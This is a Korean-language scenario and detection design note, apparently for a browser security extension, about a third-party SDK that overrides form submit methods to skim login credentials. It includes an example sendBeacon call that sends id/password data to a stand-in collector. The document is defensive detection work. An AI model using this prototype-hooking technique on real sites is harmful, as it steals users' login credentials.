[상황]

운영자는 정상적인 로그인 폼(/login)을 제공한다.
페이지에는 흔히 있는 서드파티 SDK(광고/분석/위젯) 가 포함되어 있고, 이 SDK가 편의 기능/추적을 이유로 런타임에서 폼 제출 동작을 가로채는 상황을 가정한다.

핵심은 서버나 HTML만 보면 정상인데, 브라우저 런타임에서만 제출 동작의 진실이 바뀐다는 점이다.

[공격(동작) 순서]

폼/HTML은 정상

form.action = /login

화면상 UI도 정상, 운영자 서버도 정상.

서드파티 SDK 로드 순간에 prototype 변조

SDK가 로드되면서
HTMLFormElement.prototype.submit / requestSubmit 이
native 함수가 아닌 커스텀 함수로 교체(오버라이드) 된다.

이 단계에서 확장프로그램은 PROTO_TAMPER 이벤트를 기록한다.

사용자 제출 시, 겉보기엔 정상 제출

사용자가 로그인 버튼을 누르거나,
페이지 코드가 form.submit() / form.requestSubmit() 을 호출한다.

개발자/운영자 입장에서는 그냥 정상 submit처럼 보인다.

실제로는 훅이 먼저 실행되어 유출 발생

오버라이드된 훅이 submit 직전에 실행되어
FormData(예: id/password)를 수집하고,
navigator.sendBeacon("http://localhost:4000/collect", …) 같은 방식으로
외부(서드파티)로 데이터가 동시에 전송된다.

확장프로그램은 이 외부 송신을 SUSP_NETWORK_CALL(NETWORK_LEAK) 로 기록한다.

운영자 서버(/login)는 정상 요청만 받음

브라우저는 원래대로 /login에 정상 POST를 보내고 로그인도 성공할 수 있다.

즉, 서버/WAF/백엔드 로그만 보면 정상 로그인이라 이상 징후가 희미하다.

[결정적 장면]

콘솔/콜렉터 로그에서 한 세션 안에 아래가 연달아 찍힌다.

PROTO_TAMPER
→ submit/requestSubmit이 native가 아니게 바뀜(런타임 변조 증거)

FORM_SUBMIT_AFTER_PROTO_TAMPER (mismatch=false라도 점수/심각도 상승)
→ 변조가 실제 제출과 연결됨(상태 기반 상관분석) + evidence로 dtMs/스냅샷 제시

NETWORK_LEAK (sendBeacon → 4000/collect)
→ 서버는 정상인데, 브라우저 런타임에서만 유출 발생

이 3개가 붙으면:
서버는 정상인데, 브라우저에서만 로그인 정보가 같이 빠져나갔다.

[탐지 요소]

Prototype 변조 탐지: HTMLFormElement.prototype.submit/requestSubmit의 native 여부/descriptor 변화 → PROTO_TAMPER

상태 기반 연계: PROTO_TAMPER가 한 번이라도 감지된 뒤 발생한 FORM_SUBMIT을 FORM_SUBMIT_AFTER_PROTO_TAMPER로 승격 + evidence 첨부

외부 송신 탐지: sendBeacon/fetch 등 → NETWORK_LEAK
